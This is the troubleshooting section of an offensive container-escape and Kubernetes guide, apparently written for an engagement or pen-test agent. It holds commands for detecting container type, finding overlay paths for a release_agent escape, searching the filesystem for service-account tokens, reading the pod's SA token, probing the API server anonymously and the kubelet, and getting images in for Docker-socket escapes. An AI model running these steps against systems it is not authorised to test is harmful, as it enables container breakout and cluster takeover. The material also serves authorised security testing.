→ Report the container as hardened in the engagement state Blocked section

## Troubleshooting

### Can't determine container type

Check multiple indicators:
```bash
cat /proc/1/cgroup 2>/dev/null
cat /proc/1/sched 2>/dev/null | head -1  # Shows real process name
ls -la / | grep -E "dockerenv|containerenv"
stat -fc %T /sys/fs/cgroup/  # "cgroup2fs" = cgroup v2
```
If none match, you may be in a VM, not a container.

### Docker socket found but docker CLI missing

Use curl with the UNIX socket (Step 2, "Via curl" section). All Docker operations
are available via REST API.

### release_agent exploit writes file but no output

The container overlay path detection may be wrong. Try brute-force:
```bash
# Check /proc/self/mountinfo for the upperdir path
grep upperdir /proc/self/mountinfo

# Alternative: iterate /proc to find container path
for pid in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  cat /proc/$pid/mountinfo 2>/dev/null | grep upperdir | head -1
done
```

### Kubernetes API returns 403 Forbidden

The service account lacks permissions. Try:
1. Check what you CAN do: `auth can-i --list`
2. Look for other SA tokens on disk: `find / -name "token" 2>/dev/null`
3. Check for other pods with more permissive SAs
4. Try anonymous access: `curl -sk $APISERVER/api/v1/` (without token)
5. Check kubelet API on node (port 10250) — may have different auth

### kubectl not available in pod

Use curl with the SA token and CA cert. All examples in Steps 7-10 show
the curl equivalents. Set variables once:
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
```

### Container has no internet / can't pull images for escape

For Docker socket escapes, you need an image. Options:
1. Use an image already on the host: `docker images` → use one that exists
2. Build from a local Dockerfile
3. Import a tarball: `docker load < image.tar`
4. For Kubernetes, use an image from the cluster's private registry

### Namespace restrictions prevent escape

Even with capabilities, newer runtimes use user namespaces that limit escape.
Check:
```bash
cat /proc/self/uid_map   # If not "0 0 4294967295", user ns is active
cat /proc/self/gid_map
```
User namespace remapping severely limits most escape techniques. Focus on
application-level exploitation and network pivoting instead.
